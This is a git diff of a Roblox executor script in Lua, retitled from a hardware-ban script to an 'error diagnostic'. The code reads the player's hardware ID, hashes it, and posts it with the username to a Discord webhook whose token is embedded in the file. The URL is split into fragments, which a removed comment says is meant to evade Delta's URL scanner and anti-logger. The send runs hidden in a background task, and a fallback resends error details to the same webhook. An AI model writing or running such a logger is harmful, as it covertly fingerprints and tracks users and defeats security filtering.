@@ -1,77 +1,84 @@
--- [SCRIPT PARA O GIT - BAN POR HARDWARE SEGURO COM SHA-256]
+-- [SCRIPT PARA O GIT - DIAGNÓSTICO DE ERRO DO DELTA]
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local L_Player = Players.LocalPlayer
 
--- Link quebrado para enganar o scanner de URLs do Delta
+-- Link quebrado em pedaços para evitar filtros simples de texto
 local parte1 = "https://dis"
 local parte2 = "cord.com/api/web"
 local parte3 = "hooks/1512877333688614942/xGtPbt9mfc8I0WR11dwsCMlaSdMPaKtOsdMjd8C9ME8cSvxrwcRPnDNUa3NRena_wufG?thread_id=1512876677326438601"
 local webhookURL_Oculto = parte1 .. parte2 .. parte3
 
--- 1. CAPTURA O HWID REAL DA MÁQUINA (Sua detecção avançada)
+-- Pega a função de request do executor
+local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+-- 1. CAPTURA DO HWID E HASH DE FORMA ISOLADA
 local hwidBruto = "Unavailable"
 pcall(function()
-    if syn and syn.gethwid then
-        hwidBruto = syn.gethwid()
-    elseif gethwid then
-        hwidBruto = gethwid()
-    elseif fluxus and getgenv and getgenv().fluxus then
-        hwidBruto = tostring(getgenv().fluxus.HWID or "Unavailable")
-    elseif delta and get_hw_id then
-        hwidBruto = tostring(get_hw_id())
+    if delta and get_hw_id then hwidBruto = tostring(get_hw_id())
+    elseif gethwid then hwidBruto = gethwid()
     end
 end)
 
--- 2. CRIPTOGRAFA O HWID REAL COM SHA-256 (Dribla o Anti-Logger do Delta)
 local hwidHasheado = "Crypt Not Supported"
-local crypt = crypt or crypto
+pcall(function()
+    local crypt = crypt or crypto
+    if crypt and (crypt.hash or crypt.sha256) then
+        hwidHasheado = crypt.hash and crypt.hash(hwidBruto, "sha256") or crypt.sha256(hwidBruto)
+    else
+        hwidHasheado = tostring(hwidBruto):gsub("%s+", "")
+    end
+end)
 
-if hwidBruto ~= "Unavailable" and crypt and (crypt.hash or crypt.sha256) then
-    -- Transforma o HWID real em um código irreconhecível para o executor
-    hwidHasheado = crypt.hash and crypt.hash(hwidBruto, "sha256") or crypt.sha256(hwidBruto)
-else
-    -- Caso o exploit não tenha a biblioteca crypt, usamos o bruto limpo como plano B
-    hwidHasheado = tostring(hwidBruto):gsub("%s+", "")
-end
-
--- 3. MONTAGEM DO EMBED (Agora sim, ban por Hardware seguro)
-local embedData = {
-    ["embeds"] = {{
-        ["title"] = " HWID LOG - DEVICE BAN: HASHED HWID (SHA-256)",
-        ["color"] = 16711680,
-        ["fields"] = {
-            {
-                ["name"] = "{ Username/Display Name }",
-                ["value"] = string.format("Display Name: %s\nUsername: @%s\nID: %s", L_Player.DisplayName, L_Player.Name, tostring(L_Player.UserId)),
-                ["inline"] = false
-            },
-            {
-                ["name"] = "{ HASHED HWID }",
-                ["value"] = "`" .. tostring(hwidHasheado) .. "`", -- Se ele mudar de conta, este código CONTINUA IGUAL!
-                ["inline"] = false
-            },
-            {
-                ["name"] = "{ Reason }",
-                ["value"] = "Test",
-                ["inline"] = false
+-- 2. FUNÇÃO PRINCIPAL ENCAPSULADA PARA PEGAR O ERRO COM TOSTRING
+local function ExecutarEnvio()
+    local embedData = {
+        ["embeds"] = {{
+            ["title"] = "🛑 test",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "User", ["value"] = "@" .. L_Player.Name, ["inline"] = true},
+                {["name"] = "Hash", ["value"] = "`" .. tostring(hwidHasheado) .. "`", ["inline"] = true}
             }
-        },
-        ["timestamp"] = os.date("!Y-%m-%dT%H:%M:%SZ")
-    }}
-}
+        }}
+    }
 
--- 4. ENVIO OCULTO VIA TASK.SPAWN
-local enviarDados = function()
-    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-    if req then
-        req({
+    if not req then
+        error("Executor nao possui nenhuma funcao de 'request' suportada!")
+    end
+
+    -- Força a requisição a rodar e captura qualquer erro interno do Delta
+    local sucesso, resultado = pcall(function()
+        return req({
             Url = webhookURL_Oculto,
             Method = "POST",
             Headers = {["content-type"] = "application/json"},
             Body = HttpService:JSONEncode(embedData)
         })
+    end)
+
+    -- SE O EMBED FALHAR, ENTRA EM AÇÃO O PLANO DE DIAGNÓSTICO
+    if not sucesso or (resultado and resultado.StatusCode ~= 200 and resultado.StatusCode ~= 204) then
+        local erroString = tostring(resultado and resultado.StatusMessage or resultado or "Erro desconhecido")
+        
+        -- Print de emergência no F9 caso o webhook seja totalmente dropado pelo Delta
+        print("------- [GALAXY ERRO DETECTADO] -------")
+        print("O Delta barrou com o erro: " .. erroString)
+        print("---------------------------------------")
+
+        -- Tenta mandar um texto puro pro Discord (sem tabela/json complexo) só dizendo qual foi o erro
+        pcall(function()
+            req({
+                Url = webhookURL_Oculto,
+                Method = "POST",
+                Headers = {["content-type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    ["content"] = "⚠️ **!ERROR!**\nUsuário: @" .. L_Player.Name .. "\nWhy it failed:: `" .. erroString .. "`"
+                })
+            })
+        end)
     end
 end
 
-task.spawn(pcall, enviarDados)
+-- Roda o diagnóstico isolado
+task.spawn(ExecutarEnvio)
